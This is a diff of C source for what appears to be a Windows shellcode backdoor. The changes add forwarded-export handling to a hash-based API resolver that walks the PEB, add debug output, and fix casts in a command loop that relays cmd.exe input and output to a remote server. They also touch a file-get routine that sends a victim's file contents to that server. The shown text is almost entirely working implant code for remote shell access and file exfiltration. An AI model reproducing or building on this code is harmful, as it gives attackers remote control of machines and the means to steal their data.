@@ -232,7 +232,7 @@ void main(void)
     if (x.f.api[i] == NULL) {
       DEBUG_PRINT("Critical failure: Unable to resolve API for %08X",
           api_tbl[i]);
-      return;
+      //return;
     }
   }
   
@@ -301,14 +301,15 @@ LPVOID getapi (DWORD dwHash)
   PIMAGE_DOS_HEADER        dos;
   PIMAGE_NT_HEADERS        nt;
   PVOID                    base;
-  DWORD                    cnt=0, ofs=0, idx, rva, dll_h;
+  DWORD                    cnt=0, ofs=0, i, j, idx, rva, api_h, dll_h;
   PIMAGE_DATA_DIRECTORY    dir;
   PIMAGE_EXPORT_DIRECTORY  exp;
   PDWORD                   adr;
   PDWORD                   sym;
   PWORD                    ord;
-  PCHAR                    api, dll;
+  PCHAR                    api, dll, p;
   LPVOID                   api_adr=0;
+  CHAR                     dll_name[64], api_name[128];
   
 #if defined(_WIN64)
   peb = (PPEB) __readgsqword(0x60);
@@ -350,6 +351,37 @@ LPVOID getapi (DWORD dwHash)
       if (api_hash(api)+dll_h == dwHash) {
         // return address of function
         api_adr=RVA2OFS(LPVOID, base, adr[ord[cnt-1]]);
+        // is this a forward reference?
+        if ((PBYTE)api_adr >= (PBYTE)exp &&
+            (PBYTE)api_adr <  (PBYTE)exp + 
+            dir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)
+        {
+          DEBUG_PRINT("%08X is forwarded to %s", 
+              dwHash, api_adr);
+              
+          // copy DLL name to buffer
+          for (i=0, p=api_adr; p[i] != 0 && i < sizeof(dll_name)-1; i++) {
+            dll_name[i] = p[i];
+            if (p[i] == '.') break;
+          }
+          dll_name[i+1] = 'D';
+          dll_name[i+2] = 'L';
+          dll_name[i+3] = 'L';
+          dll_name[i+4] = 0;
+          // copy API name to buffer
+          for(j=0; p[++i] != 0 && j < sizeof(api_name)-1; j++) { 
+            api_name[j] = p[i]; 
+          }
+          api_name[j] = 0;
+          // calculate hash for DLL and API
+          dll_h = api_hash(dll_name);
+          api_h = api_hash(api_name);
+          DEBUG_PRINT("hash for %s and %s = %08X", 
+              dll_name, api_name, dll_h + api_h);
+          // now try again
+          api_adr = getapi(dll_h + api_h);
+          // if we don't have at this point, bail out.
+        }
         break;
       }
     } while (--cnt && api_adr==0);
@@ -881,7 +913,7 @@ void cmd_loop(sc_tbl *x)
       DEBUG_PRINT("writing to stdin");
       // write to stdin
       x->f.pWriteFile (x->v.in0, x->v.blk.data.b, 
-          x->v.blk.len.w, &x->v.blk.len.w, 0);             
+          x->v.blk.len.w, (PDWORD)&x->v.blk.len.w, 0);             
     } else
    
     // stdout/stderr of cmd.exe?
@@ -893,13 +925,13 @@ void cmd_loop(sc_tbl *x)
         DEBUG_PRINT("reading from stdout");
         
         x->f.pReadFile (x->v.out1, x->v.blk.data.b, 
-            BUFSIZ, &x->v.blk.len.w, &lap);
+            BUFSIZ, (PDWORD)&x->v.blk.len.w, &lap);
         p++;
       } else {
         DEBUG_PRINT("getting overlapped result");
         
         if (!x->f.pGetOverlappedResult (x->v.out1, 
-            &lap, &x->v.blk.len.w, FALSE)) 
+            &lap, (PDWORD)&x->v.blk.len.w, FALSE)) 
         {
           DEBUG_PRINT("overlapped error %i", 
               x->f.pGetLastError());
@@ -1052,25 +1084,30 @@ void c_get(sc_tbl *x)
       GENERIC_READ, FILE_SHARE_READ, NULL, 
       OPEN_EXISTING, 0, NULL);
       
+  DEBUG_PRINT("c_get: createfile returned %08X", in);
+  
   // report open status to server
   x->v.blk.data.fx.err = x->f.pGetLastError();
-  x->v.blk.len.w  = sizeof(int);
+  x->v.blk.len.w       = sizeof(int);
   
   // if status is ok, send the file size also
   if (x->v.blk.data.fx.err == ERROR_SUCCESS) {
+    DEBUG_PRINT("c_get: getting size of file");
     x->v.blk.len.w += sizeof(uint64_t);
     x->f.pGetFileSizeEx (in, (PLARGE_INTEGER)&x->v.blk.data.fx.size);
   }
+  DEBUG_PRINT("c_get sending details of file");
   // now send details
   spp_send(x);
   
   if (in!=INVALID_HANDLE_VALUE)
   {
+    DEBUG_PRINT("c_get: sending contents");
     for (;;) 
     {
       // read data from file
       x->f.pReadFile(in, x->v.blk.data.b, 
-        SPP_DATA_LEN, &x->v.blk.len.w, 0);
+        SPP_DATA_LEN, (PDWORD)&x->v.blk.len.w, 0);
         
       // zero length indicates EOF
       eof=(x->v.blk.len.w==0);
